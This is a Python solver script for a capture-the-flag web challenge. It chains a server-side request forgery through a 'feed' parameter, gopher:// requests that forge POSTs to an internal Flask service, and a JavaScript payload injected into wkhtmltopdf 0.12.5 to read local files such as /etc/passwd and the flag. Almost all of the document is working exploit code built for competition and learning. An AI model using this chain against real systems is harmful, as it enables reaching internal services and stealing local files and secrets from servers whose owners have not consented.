#!/usr/bin/env python3
"""
SunshineCTF 2026 - web - "Groundhog Day" (469)
https://odyssey.web.2026.sunshinectf.games

Chain
-----
1. The public console renders station telemetry fetched server-side from a
   URL taken from the `feed` query parameter (an HTML comment leaks it):
       /?feed=<url>
   The fetcher is PycURL/libcurl (revealed by httpbin.org/get's User-Agent),
   so `gopher://` is supported.

2. `gopher://127.0.0.1:8000/_<raw-bytes>` lets us speak arbitrary TCP to the
   internal-only Flask app on localhost:8000, including a POST (the console's
   own fetcher is GET-only, and /report is POST-only).

3. Internal POST /report renders attacker HTML to a PDF with wkhtmltopdf
   0.12.5.  That version still allows local file access by default, so an
   XMLHttpRequest against file:///flag.txt reads the flag straight into the
   rendered document, which comes back base64-encoded in the JSON response.

Usage:  python3 solver.py
"""

import base64
import html
import json
import os
import re
import subprocess
import sys
import tempfile
import urllib.parse

import requests

BASE = "https://odyssey.web.2026.sunshinectf.games/"
INTERNAL = "127.0.0.1:8000"


def gopher_post(path, body, host=INTERNAL):
    """Build a gopher:// URL that makes libcurl send an arbitrary POST."""
    body = body.encode() if isinstance(body, str) else body
    raw = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    safe = b"-._~"
    enc = "".join(
        chr(c) if (48 <= c <= 57 or 65 <= c <= 90 or 97 <= c <= 122 or c in safe)
        else "%%%02X" % c
        for c in raw
    )
    return f"gopher://{host}/_{enc}"


def ssrf(feed, timeout=60):
    """Drive the console's server-side fetch of `feed`."""
    r = requests.get(BASE, params={"feed": feed}, timeout=timeout)
    return r.text


def tape(page):
    """The console dumps the raw upstream HTTP response into <pre class=tape>."""
    m = re.search(r'<pre class="tape">(.*?)</pre>', page, re.S)
    return html.unescape(m.group(1)) if m else ""


def render_pdf(content_html, title="report"):
    """POST content to the internal /report and return the raw PDF bytes."""
    body = (
        "content=" + urllib.parse.quote(content_html)
        + "&title=" + urllib.parse.quote(title)
    )
    page = ssrf(gopher_post("/report", body))
    raw = tape(page)
    m = re.search(r"\r?\n\r?\n(.*)$", raw, re.S)
    payload = m.group(1) if m else raw
    doc = json.loads(payload)
    return base64.b64decode(doc["data"])


def pdf_text(pdf_bytes):
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as fh:
        fh.write(pdf_bytes)
        path = fh.name
    try:
        out = subprocess.run(
            ["pdftotext", "-layout", path, "-"],
            capture_output=True, timeout=60,
        )
        return out.stdout.decode("utf-8", "replace")
    finally:
        os.unlink(path)


def read_file(path):
    """Arbitrary local file read inside the internal container."""
    c = (
        '<script>var x=new XMLHttpRequest();'
        f'x.open("GET","file://{path}",false);x.send();'
        'document.write("<pre>"+x.responseText+"</pre>");</script>'
    )
    return pdf_text(render_pdf(c, "read"))


def main():
    flag_path = sys.argv[1] if len(sys.argv) > 1 else "/flag.txt"

    # Sanity check: the internal archive page advertises /report + wkhtmltopdf.
    print("[*] internal archive:")
    print("    " + read_file("/etc/passwd").splitlines()[0].strip())

    print(f"[*] reading file://{flag_path} via wkhtmltopdf 0.12.5 ...")
    text = read_file(flag_path)
    m = re.search(r"sun\{[^}]+\}", text)
    if not m:
        print("[-] no flag found; raw output:")
        print(text[:1000])
        sys.exit(1)
    print(f"[+] FLAG: {m.group(0)}")


if __name__ == "__main__":
    main()
